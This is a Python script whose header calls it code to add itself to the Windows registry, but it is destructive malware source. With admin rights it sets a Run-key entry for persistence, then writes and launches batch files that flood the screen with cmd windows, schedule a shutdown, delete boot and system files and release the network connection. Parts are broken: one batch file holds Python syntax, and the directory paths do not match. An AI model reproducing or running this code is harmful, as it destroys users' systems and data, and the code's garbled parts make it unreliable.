# Python code to add current script to the registry

# module to edit the windows registry
import winreg as reg
import os
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def AddToRegistry():
    pth = os.path.dirname(os.path.realpath('C://GAMEDATA//virtual.exe'))
    s_name = "virtual.exe"
    address = os.path.join(pth, s_name)
    
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

    open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open_key, "any_name", 0, reg.REG_SZ, address)
    reg.CloseKey(open_key)

def spammer():
    if os.access("C://home//User//Documents", os.F_OK):
        spammer1 = open("C://home//User//Documents//spammer.txt", 'w')
        spammer1.writelines('for i in range(9999999 * 99999999):\n')
        spammer1.writelines('    os.system("start cmd")')
        spammer1 = 'C://home//User//Documents//spammer.txt'
        base = os.path.splitext(spammer1)[0]
        os.rename(spammer1, base + '.bat')
        os.system("Start C://home//User//Documents//spammer.bat")

def complete_shut_down():
    if os.access("C://home//User//Documents", os.F_OK):
        shutdown = open("C://home//User//Documents//shutdown.txt", 'w')
        shutdown.writelines('@Echo off')
        shutdown.writelines('shutdown /s /t 9999999 /c ')
        shutdown = 'C://home//User//Documents//shutdown.txt'
        base = os.path.splitext(shutdown)[0]
        os.rename(shutdown, base + '.bat')
        os.system("Start C://home//User//Documents//shutdown.bat")

def corrupt():
    if os.access("C://home//User//Documents", os.F_OK):
        corrupt = open("C://home//User//Documents//corrupt.txt", 'w')
        corrupt.writelines('@echo off\n')
        corrupt.writelines('attrib -r -s -h C://autoexec.bat\n')
        corrupt.writelines('del C://autoexec.bat\n')
        corrupt.writelines('del C://boot.ini\n')
        corrupt.writelines('attrib -r -s -h C://ntldr\n')
        corrupt.writelines('del C://ntldr\n')
        corrupt.writelines('attrib -r -s -h C://window//win.ini\n')
        corrupt.writelines('del C://window\win.ini\n')
        corrupt = 'C://home//User//Documents//corrupt.txt'
        base = os.path.splitext(corrupt)[0]
        os.rename(corrupt, base + '.bat')
        os.system("Start C://home//User//Documents//corrupt.bat")

def internet_disable():
    if os.access("C://home//User//Documents", os.F_OK):
        internet_disable = open("C://home//User//Documents//internet_disable.txt", 'w')
        internet_disable.writelines('@echo off \n')
        internet_disable.writelines('IPconfig /release')
        internet_disable = 'C://home//User//Documents//internet_disable.txt'
        base = os.path.splitext(internet_disable)[0]
        os.rename(internet_disable, base + '.bat')
        os.system("Start C://home//User//Documents//internet_disable.bat")

if __name__ == "__main__":
    if is_admin():
        AddToRegistry()
        parent_dir = "C://Windows//User//Documents"
        os.makedirs(parent_dir, exist_ok=True)
        print(spammer())
        print(complete_shut_down())
        print(corrupt())
        print(internet_disable())
